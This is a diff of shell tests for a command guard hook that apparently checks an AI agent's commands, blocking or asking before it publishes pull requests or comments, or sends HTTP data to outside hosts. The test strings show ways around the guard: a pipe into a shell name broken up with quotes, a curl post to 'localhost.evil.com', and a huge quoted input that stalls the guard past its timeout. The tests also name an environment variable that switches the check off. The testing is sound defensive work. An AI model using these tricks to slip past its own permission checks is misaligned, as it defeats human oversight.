@@ -253,4 +253,59 @@ run_hook "$S" "$(jsonin 'curl -d x http://127.0.0.1:8080/x')"
 assert_rc 0 "an HTTP write to a loopback address allowed"
 assert_eq "$OUT" "" "an HTTP write to a loopback address asks nothing"
 
+# A redirect or a quoted word between a command and its subcommand does not hide it (#131).
+run_hook "$S" "$(jsonin 'gh >out pr create --fill')"
+assert_rc 2 "a ready PR behind a redirect after gh blocked"
+run_hook "$S" "$(jsonin 'gh pr "comment" 1 -b x')"
+assert_rc 2 "a quoted publish verb blocked"
+for c in 'gh pr view 1 > out' 'gh pr create --draft --fill'; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 0 "$c allowed"
+  assert_eq "$OUT" "" "$c asks nothing"
+done
+
+# A shell's name with quotes inside it is still its name (#134).
+pipe_asks 'cat x | b"as"h' "a pipe into a shell whose name holds quotes asks"
+run_hook "$S" "$(jsonin 'echo b"as"h')"
+assert_rc 0 "a shell's quoted name as an argument allowed"
+assert_eq "$OUT" "" "a shell's quoted name as an argument asks nothing"
+# In a UTF-8 locale, dropping the quotes from this text took the guard 19 s, past its timeout. So it must ask within half
+# that budget.
+quoted="echo $(printf 'é"ü\\ %.0s' {1..18000}); cat x | b\"as\"h"
+LC_ALL=C.UTF-8 run_hook_within 5 "$S" "$(jsonin "$quoted")"
+assert_rc 0 "a pipe into a quoted shell after 18,000 quoted words is decided in half the hook budget"
+assert_out '"permissionDecision":"ask"' "a pipe into a quoted shell after 18,000 quoted words asks"
+
+# A quote that closes a URL is not part of its host (#135).
+for c in 'curl -d x "http://localhost"' "curl -d x 'http://localhost'" 'curl -d x "http://localhost:3000/api"'; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 0 "$c allowed"
+  assert_eq "$OUT" "" "$c asks nothing"
+done
+for c in 'curl -d x "http://example.com"' 'curl -d x "http://localhost.evil.com"'; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 2 "$c blocked"
+done
+
+# A verb read from one piece of a quoted argument asks, and the question names the piece (#131).
+for c in 'claude "review this"' "ssh host 'npm publish'"; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 0 "$c is not refused outright"
+  assert_out '"permissionDecision":"ask"' "$c asks"
+  assert_out 'one piece of a quoted argument' "$c says why"
+done
+assert_out "read from publish'" "the question names the piece"
+run_hook "$S" "$(jsonin 'python3 x.py "a post here"')"
+assert_rc 2 "a verb in the middle of a quoted argument blocked, as before"
+run_hook "$S" "$(jsonin 'git commit -m "post the review"')"
+assert_rc 0 "a commit message naming verbs allowed"
+assert_eq "$OUT" "" "a commit message naming verbs asks nothing"
+# The per-line split cuts quoted lines into pieces, so a piece read there asks nothing, as on main.
+run_hook "$S" "$(jsonin $'git commit -m "Fix it\nsee the review"')"
+assert_eq "$OUT" "" "a multi-line commit message ending in a verb asks nothing"
+export ALLOW_PUBLISH_AS_ME=1
+run_hook "$S" "$(jsonin 'claude "review this"')"
+assert_eq "$OUT" "" "environment hatch asks nothing about a piece of a quoted argument"
+unset ALLOW_PUBLISH_AS_ME
+
 finish "guard-publish"
